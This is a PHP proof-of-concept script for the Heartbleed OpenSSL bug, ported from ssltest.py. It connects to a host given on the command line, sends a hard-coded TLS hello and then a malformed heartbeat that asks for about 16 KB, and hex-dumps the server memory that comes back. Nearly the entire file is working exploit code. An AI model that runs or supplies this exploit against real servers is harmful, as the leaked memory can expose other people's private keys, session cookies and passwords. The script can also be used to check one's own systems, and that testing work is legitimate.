<?php
/**
* Heartbleed POC
*
* @author Zerquix18
*
* @link http://github.com/zerquix18/heartbleed
*
* NOTE: This is the translation of ssltest.py from python to PHP
* Don't be evil...
**/
echo "--------PHP Heartbleed POC ---------------\n\n";
ob_start();
if( 1 == $argc )
	exit("Usage: \"php ssltest.php url.com 443\"\n");
array_shift($argv);
$data = array(
		$argv[0],
		array_key_exists(1, $argv) && is_numeric($argv[1]) ? $argv[1] : 443
	);
if( false == ($s = socket_create(AF_INET, SOCK_STREAM, SOL_TCP) ) )
	exit("Unable to create socket!");

function h2bin( $x ) {
	$x = str_replace( array(" ", "\n"), "", $x);
	return hex2bin($x);
}
$hello = h2bin("16 03 02 00  dc 01 00 00 d8 03 02 53
43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf
bd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00
00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88
00 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1c
c0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09
c0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44
c0 0e c0 04 00 2f 00 96  00 41 c0 11 c0 07 c0 0c
c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11
00 08 00 06 00 03 00 ff  01 00 00 49 00 0b 00 04
03 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 19
00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08
00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13
00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00
00 0f 00 01 01");
$hb = h2bin("18 03 02 00 03
01 40 00");
/**
*
* Thanks: http://stackoverflow.com/a/4225813/1932946
**/
function hexdump($data) {
  static $width = 16;
  static $pad = '.';
  static $from = '';
  static $to = '';
  if ($from==='')
  {
    for ($i=0; $i<=0xFF; $i++)
    {
      $from .= chr($i);
      $to .= ($i >= 0x20 && $i <= 0x7E) ? chr($i) : $pad;
    }
  }
  $hex = str_split(bin2hex($data), $width*2);
  $chars = str_split(strtr($data, $from, $to), $width);
  $offset = 0;
  foreach ($hex as $i => $line) {
    echo sprintf('%6X',$offset).' : '.implode(' ', str_split($line,2)) . ' [' . $chars[$i] . "]\n";
    $offset += $width;
  }
}
function recvall($length, $timeout = 5) {
	global $s;
	$endtime = time() + $timeout;
	$rdata = "";
	$remain = $length;
	while($remain > 0) {
		$rtime = $endtime - $timeout;
		if( $rtime < 0 )
			return null;
		$e = NULL;
		$r = array($s);
		@socket_select( $r, $w, $e, 5);
		if( in_array($s, $r) ) {
			$d = @socket_recv($s, $data, $remain, 0 );
			if( false == $data )
				return null;
			$rdata .= $data;
			$remain -= strlen($data);
		}
	}
	return $rdata;
}
function recvmsg() {
	global $s;
	$hdr = recvall(5);
	if( null === $hdr ):
		echo "Unexpected EOF receiving record header - server closed connection\n";
		return array(null, null, null);
	endif;
	list($typ, $ver, $ln) = array_values( unpack("Cn/n/nC", $hdr) );
	$pay = recvall($ln, 10);
	if( null === $pay ) {
		echo "Unexpected EOF receiving record payload - server closed connection\n";
		return array(null, null, null);
	}
	printf(" ... received message: type = %d, ver = %04x, length = %d\n", $typ, $ver, strlen($pay) );
	return array($typ, $ver, $pay);
}
function hit_hb() {
	global $hb, $s;
	socket_send($s, $hb, strlen($hb), 0);
	while( true ) {
		list($typ, $ver, $pay) = recvmsg();
		if( null === $typ )
			 exit('No heartbeat response received, server likely not vulnerable');
		if( 24 == $typ ){
			echo "Received heartbeat response:\n";
			hexdump($pay);
			if( strlen($pay) > 3 )
				echo 'WARNING: server returned more data than it should - server is vulnerable!';
			else
				echo 'Server processed malformed heartbeat, but did not return any extra data.';
			return true;
		}
		if( 21 == $typ ) {
			echo "Received alert:\n";
			hexdump($pay);
			echo 'Server returned error, likely not vulnerable';
			return false;
		}
	}
}
echo "Connecting to socket...\n";
$s_ = socket_connect( $s, $data[0], (int) $data[1] );
if( ! $s )
	exit("Error [". socket_last_error() . "]: " . socket_strerror( socket_last_error() ) . "\n" );
echo "Sending client hello...\n";
@socket_send($s, $hello, strlen($hello), 0 );
ob_flush();
while( true ) {
	list($typ, $ver, $pay) = recvmsg();
	if( null == $typ )
		exit("Server closed conection without sending hello!\n");

	if( 22 == $typ && ord($pay[0]) == 0x0E )
		break;
}
echo "Sending heartbeat request...\n";
ob_flush();
@socket_send($s, $hb, strlen($hb), 0);
hit_hb();
